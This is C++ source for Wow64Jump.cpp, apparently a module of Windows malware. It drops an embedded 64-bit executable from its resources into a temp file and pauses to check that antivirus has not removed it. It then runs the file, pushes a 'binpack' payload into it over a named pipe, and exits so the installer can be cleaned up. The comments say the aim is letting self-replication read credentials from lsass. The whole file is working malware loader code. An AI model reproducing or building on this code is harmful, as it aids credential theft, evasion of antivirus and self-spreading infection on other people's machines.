/*
	Wow64Jump.cpp
	Transfer execution from x32 process into x64 using rsex64 from resources
	Executed at early init of wdd module, before pipe/mailslot servers creation

	NB: compiled only for x32 target
*/

#include <Windows.h>

#include "dbg.h"
#include "mem.h"
#include "EmbeddedResources.h"
#include "PipeWorks.h"

#include "Wow64Jump.h"

/*
Attempts to read entire contents of file specified by wszFilename
Buffer allocated internally and should be disposed by caller
*/
BOOL wjReadFileContents(LPWSTR wszFilename, LPVOID *pBuffer, DWORD *dwLen)
{
	BOOL bRes = FALSE;	// func result
	HANDLE hFile;	// file handle
	DWORD dwFSHigh = 0;	// GetFileSize() high part
	DWORD dwRead = 0;	// ReadFile() result

	// check for input
	if ((!pBuffer) || (!dwLen) || (!wszFilename)) { DbgPrint("ERR: invalid input params"); return bRes; }

	// init
	*pBuffer = NULL;
	*dwLen = 0;

	// try to open file
	hFile = CreateFile(wszFilename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE != hFile) {

		// query needed buffer size
		*dwLen = GetFileSize(hFile, &dwFSHigh);

		// check size
		if ((!dwFSHigh) && (*dwLen)) {

			// try to alloc mem
			*pBuffer = my_alloc(*dwLen);
			if (*pBuffer) {

				// allocated ok, read
				ReadFile(hFile, *pBuffer, *dwLen, &dwRead, NULL);

				// check resulting sized
				if (dwRead == *dwLen) {

					DbgPrint("read ok");
					bRes = TRUE;

				}
				else { DbgPrint("ERR: sizes mismatch when reading [%ws]: expected %u, actual %u", wszFilename, *dwLen, dwRead); }

			}
			else { DbgPrint("ERR: failed to alloc %u bytes to open [%ws]", *dwLen, wszFilename); }

		}
		else { DbgPrint("ERR: empty [%ws] filesize: len=%u len_high=%u", wszFilename, *dwLen, dwFSHigh); }

		CloseHandle(hFile);

	}
	else { DbgPrint("ERR: failed to open for reading file [%ws]", wszFilename); }

	return bRes;
}

BOOL wjPlantRSEFile(LPWSTR wszTargetName, ARCH_TYPE at)
{
	BOOL bRes = FALSE;	// function res
	HANDLE hFile;	// handle to remote file

	// filled by called function which extracts contents of planting file (remote service exe)
	LPVOID pFileBuff = NULL;
	DWORD dwFileLen = 0;

	BOOL bWritten = FALSE;	// flag indicating if a file was written
	DWORD dwWritten = 0;	// WriteFile() result

	// used to read file's contents when it was written to remote machine, for verification
	LPVOID pVerifyFileBuff = NULL;
	DWORD dwVerifyFileBuffLen = 0;

//	DR_ACCESS_VARS dav = { 0 };

	if (!wszTargetName) { DbgPrint("ERR: invalid input params"); return bRes; }

	DbgPrint("target name [%ws]", wszTargetName);

	// prepare sa with Everyone r/re access
//	if (!drInitEveryoneREsa(&dav)) { DbgPrint("WARN: failed to init sa"); }

	hFile = CreateFile(wszTargetName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (INVALID_HANDLE_VALUE != hFile) {

		DbgPrint("file created ok, writing");

		// query contents of planting file to special internal api, using ARCH_TYPE at passed (unk, x32, x64)
		if (erQueryFile(RES_TYPE_RSE, at, &pFileBuff, &dwFileLen, NULL, TRUE)) {

			// write file
			bWritten = WriteFile(hFile, pFileBuff, dwFileLen, &dwWritten, NULL);

			// check written amount against file size. If match -> ok write, proceed to next step
			if (dwFileLen == dwWritten) { DbgPrint("file sizes match"); }

			// not sure if this is essential
			FlushFileBuffers(hFile);

		}
		else { DbgPrint("WARN: no file to plant"); } // file generated check

		CloseHandle(hFile);

		if (bWritten) {

			// check if file is readable after a while, hash is the same - not locked or removed by AV
			// also check size to be >0 or >1024
			DbgPrint("some pre wait before reading file contents for verification..");
			Sleep(2500);
			DbgPrint("reading for verification");

			if (wjReadFileContents(wszTargetName, &pVerifyFileBuff, &dwVerifyFileBuffLen)) {

				// compare contents
				if ((dwVerifyFileBuffLen == dwFileLen) && (!memcmp(pVerifyFileBuff, pFileBuff, dwFileLen))) {

					DbgPrint("verify OK");
					bRes = TRUE;

				}
				else { DbgPrint("ERR: verification failed"); }

				// free buffer allocated by drReadFileContents()
				my_free(pVerifyFileBuff);

			}
			else { DbgPrint("ERR: failed to read file for verification"); }


		}
		else { DbgPrint("ERR: failed to write file, removing it"); DeleteFile(wszTargetName); }

		// free buffer if needed
		if (pFileBuff) { my_free(pFileBuff); }

	} // created ok

	// free mem used
//	drFreeEveryoneREsa(&dav);

	return bRes;
}


/*
	Make tmp filename
*/
BOOL _wjMakeTmpName(LPWSTR wszResBuff)
{
	BOOL bRes = FALSE;
	LPWSTR wszTmpPath = NULL;

	do {	// not a loop

		if (!wszResBuff) { DbgPrint("ERR: invalid input params"); break; }

		wszTmpPath = (LPWSTR)my_alloc(1024);
		if (!GetTempPath(512, wszTmpPath)) { DbgPrint("ERR: GetTempPath() failed, le %p", GetLastError()); break; }

		if (!GetTempFileName(wszTmpPath, NULL, 0, wszResBuff)) { DbgPrint("ERR: GetTempFileName() failed, le %p", GetLastError()); break; }

		// all done
		bRes = TRUE;

	} while (FALSE);	// not a loop

	if (wszTmpPath) { my_free(wszTmpPath); }

	return bRes;
}

/*
	Creates a process and returns it's handle, to be closed by caller
	In case of error returns NULL
*/
HANDLE wjMakeProcess(LPWSTR wszCmdline)
{
	HANDLE hRes = NULL;
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	do {	// not a loop

		si.cb = sizeof(STARTUPINFO);

		if (!CreateProcess(NULL, wszCmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) { DbgPrint("ERR: CreateProcess() failed, code %p", GetLastError()); break; }

		DbgPrint("target process started, pid %u", pi.dwProcessId);

		hRes = pi.hProcess;

	} while (FALSE); // not a loop

	return hRes;
}



/*
	Attempts to place rse x64 somewhere on disk, execute it and
	send binpack.
	In case of success, terminates current process after 10-15s wait, to allow removal of original installer.
	In case of failure simply exits, allowing init of x32 routines. In that case self-replication will be unable to read creds from x64 lsass in most cases
*/
VOID wjWow64JumpTo64()
{
	BOOL bRes = FALSE;

	LPWSTR wszTmpName = NULL;	// buffer with tmp filename generated
	HANDLE hProcess = NULL;	// resulting created process

	LPVOID pResBuff = NULL;	// resulting binpack buffer, allocated by called function
	DWORD dwResBuffLen = 0;	// ^ len

	LPVOID pContextPtr = NULL;	// ptr at pResBuff to context structure
	LPVOID pExecPtr = NULL;		// ptr at pResBuff to execution start

	DbgPrint("entered");


	do { // not a loop

		// gen rnd tmp filename
		wszTmpName = (LPWSTR)my_alloc(1024);
		if (!_wjMakeTmpName(wszTmpName)) { DbgPrint("ERR: gen tmp fname failed"); break; }

		// put rse x64 with check
		if (!wjPlantRSEFile(wszTmpName, ARCH_TYPE_X64)) { DbgPrint("ERR: failed to place rse x64"); break; }

		// run process
		if (!(hProcess = wjMakeProcess(wszTmpName))) { DbgPrint("ERR: failed to create process"); break; }

		// wait a bit to make sure it is still running
		if (WAIT_OBJECT_0 == WaitForSingleObject(hProcess, 3000)) { DbgPrint("ERR: process terminated unexpectedly"); break; }

		// check if pipe is working
		if (!pwIsRemotePipeWorkingTimeout(NULL, 20000, 500)) { DbgPrint("ERR: pipe is not working"); break; }

		// get binpack
		if (!erGetStarterBinpack(ARCH_TYPE_X64, &pResBuff, &dwResBuffLen, &pContextPtr, &pExecPtr)) { DbgPrint("ERR: failed to alloc x64 binpack"); break; }

		// send to x64 process
		if (!_pwRemotePipeCheckSend(NULL, 0, 0, pResBuff, dwResBuffLen, NULL, NULL, NULL)) { DbgPrint("ERR: failed to send binpack"); break; }

		DbgPrint("transfer to x64 assumed to be OK");
		bRes = TRUE;

	} while (FALSE); // not a loop

	if (wszTmpName) { DeleteFile(wszTmpName); my_free(wszTmpName); }
	if (hProcess) { CloseHandle(hProcess); }
	if (pResBuff) { my_free(pResBuff); }

	if (bRes) { DbgPrint("terminating"); ExitProcess(0); }
}